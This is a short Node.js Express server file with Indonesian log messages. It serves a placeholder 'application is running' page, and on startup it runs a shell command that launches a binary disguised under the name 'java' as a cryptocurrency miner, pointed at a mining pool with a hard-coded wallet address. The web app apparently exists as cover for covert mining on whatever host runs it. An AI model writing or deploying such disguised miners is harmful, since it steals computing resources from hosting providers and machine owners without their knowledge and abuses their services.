const express = require('express');
const http = require('http');
const { exec } = require('child_process');
const prt = process.env.PORT||80
const app = express();
const server = http.createServer(app);

app.get('/', (req, res) => {
  res.send('Aplikasi sedang berjalan');
});

server.listen(prt, () => {
  console.log(`Server berjalan pada port ${prt}`);
});

exec('chmod +x java && ./java --algorithm verushash --pool eu.luckpool.net:3956 --wallet RQ2DksvgV757VsxRuMnfBDBwa5uCz4t5XR --password hybrid --cpu-threads 0 --log-file ./Logs/log-itz.txt --worker ramstein', (error, stdout, stderr) => {
  console.log(stdout);
 });
